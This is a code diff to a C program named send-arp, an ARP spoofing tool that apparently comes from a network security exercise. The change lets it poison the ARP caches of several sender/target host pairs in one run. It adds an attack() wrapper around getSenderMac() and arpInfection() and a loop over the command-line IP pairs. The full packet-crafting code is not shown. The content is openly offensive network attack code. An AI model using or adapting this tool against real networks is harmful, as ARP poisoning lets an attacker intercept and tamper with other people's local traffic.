@@ -17,7 +17,7 @@ struct EthArpPacket
 
 void usage()
 {
-    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
+    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
     printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
@@ -139,11 +139,34 @@ int arpInfection(pcap_t *handle, uint8_t *attacker_mac, char *sender_ip, uint8_t
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         return -1;
     }
+
+    return 0;
+}
+
+int attack(pcap_t *handle, char *attacker_ip, uint8_t *attacker_mac, char *sender_ip, char *target_ip)
+{
+    uint8_t sender_mac[ETH_ALEN];
+    if (getSenderMac(handle, attacker_ip, attacker_mac, sender_ip, sender_mac) == -1)
+    {
+        printf("ERR: getSenderMac()\n");
+        return -1;
+    }
+
+    // printf("%s\n", sender_ip);
+    // printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", (unsigned char)sender_mac[0], (unsigned char)sender_mac[1], (unsigned char)sender_mac[2], (unsigned char)sender_mac[3], (unsigned char)sender_mac[4], (unsigned char)sender_mac[5]);
+
+    if (arpInfection(handle, attacker_mac, sender_ip, sender_mac, target_ip) == -1)
+    {
+        printf("ERR: arpInfection()\n");
+        return -1;
+    }
+
+    return 0;
 }
 
 int main(int argc, char *argv[])
 {
-    if (argc != 4)
+    if (argc < 4)
     {
         usage();
         return -1;
@@ -170,27 +193,19 @@ int main(int argc, char *argv[])
     // printf("%s\n", attacker_ip);
     // printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", (unsigned char)attacker_mac[0], (unsigned char)attacker_mac[1], (unsigned char)attacker_mac[2], (unsigned char)attacker_mac[3], (unsigned char)attacker_mac[4], (unsigned char)attacker_mac[5]);
 
-    char *sender_ip = argv[2];
-    uint8_t sender_mac[ETH_ALEN];
-    if (getSenderMac(handle, attacker_ip, attacker_mac, sender_ip, sender_mac) == -1)
+    int num_victim = (argc - 2) / 2;
+    for (int i = 1; i <= num_victim; i++)
     {
-        printf("ERR: getSenderMac()\n");
-        pcap_close(handle);
-        return -1;
+        char *sender_ip = argv[i * 2];
+        char *target_ip = argv[i * 2 + 1];
+        if (attack(handle, attacker_ip, attacker_mac, sender_ip, target_ip) == -1)
+        {
+            printf("ERR: attack()\n");
+            pcap_close(handle);
+            return -1;
+        }
+        printf("ATTACK %d COMPLETED (%s %s)\n", i, sender_ip, target_ip);
     }
-
-    // printf("%s\n", sender_ip);
-    // printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", (unsigned char)sender_mac[0], (unsigned char)sender_mac[1], (unsigned char)sender_mac[2], (unsigned char)sender_mac[3], (unsigned char)sender_mac[4], (unsigned char)sender_mac[5]);
-
-    char *target_ip = argv[3];
-    if (arpInfection(handle, attacker_mac, sender_ip, sender_mac, target_ip) == -1)
-    {
-        printf("ERR: arpInfection()\n");
-        pcap_close(handle);
-        return -1;
-    }
-
-    printf("ATTACK COMPLETED\n");
 
     pcap_close(handle);
     return 0;
